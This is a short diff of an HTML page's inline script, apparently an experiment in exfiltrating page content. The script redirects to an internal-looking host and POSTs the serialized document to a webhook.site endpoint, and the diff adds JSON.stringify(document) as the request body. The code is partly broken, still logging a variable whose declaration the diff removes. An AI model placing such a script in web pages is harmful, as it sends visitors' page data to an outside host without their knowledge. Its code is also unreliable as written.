@@ -6,18 +6,13 @@
 
 
   document.location.href = 'https://internal.sketchycompany.upd-dcs.work';
- 
-  const doc = new DOMParser().parseFromString(
-    html, 'text/html'
-  );
-
   
   fetch(`https://webhook.site/d32f86da-0fa6-4bca-808c-d1384cbde973`, {
     method: "POST",
-    body: doc
+    body: JSON.stringify(document)
   })
 
   console.log(doc);
 </script>
 
-<h2>Hello owrld new</h2>
+<h2>Hello owrld newerer</h2>
